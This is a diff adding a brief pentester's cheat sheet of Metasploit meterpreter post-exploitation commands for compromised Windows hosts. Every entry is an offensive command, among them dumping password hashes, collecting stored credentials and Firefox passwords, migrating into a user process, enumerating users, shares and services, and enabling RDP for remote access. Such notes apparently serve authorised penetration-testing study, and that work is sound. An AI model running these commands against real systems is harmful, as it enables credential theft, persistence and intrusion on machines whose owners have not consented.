@@ -1,0 +1,49 @@
+### meterpreter enum ###
+## LINKS
+https://www.offensive-security.com/metasploit-unleashed/windows-post-gather-modules/
+
+
+## LOCAL EXPLOIT SUGGESTER
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+## ARP SCANNER
+meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+
+## CHECK VM
+meterpreter > run post/windows/gather/checkvm 
+
+## CREDENTIAL COLLECTOR
+meterpreter > run post/windows/gather/credentials/credential_collector 
+
+## HASH DUMP
+meterpreter > run post/windows/gather/hashdump
+
+## DUMPLINKS
+meterpreter > run post/windows/manage/migrate 					# migrate into a user process
+meterpreter > run post/windows/gather/dumplinks 
+
+## ENUM APPLICATIONS
+meterpreter > run post/windows/gather/enum_applications 
+meterpreter > run post/multi/gather/firefox_creds
+
+## ENUM SERVICE
+meterpreter > run post/windows/gather/enum_services
+
+## ENUM LOGGED ON USERS
+meterpreter > run post/windows/gather/enum_logged_on_users
+
+## ENUM SHARES
+meterpreter > run post/windows/gather/enum_shares 
+
+## ENUM SNMP
+meterpreter > run post/windows/gather/enum_snmp
+
+## USB HISTORY
+meterpreter > run post/windows/gather/usb_history 
+
+## ENABLE RDP
+meterpreter > run post/windows/manage/enable_rdp
+
+
+
+
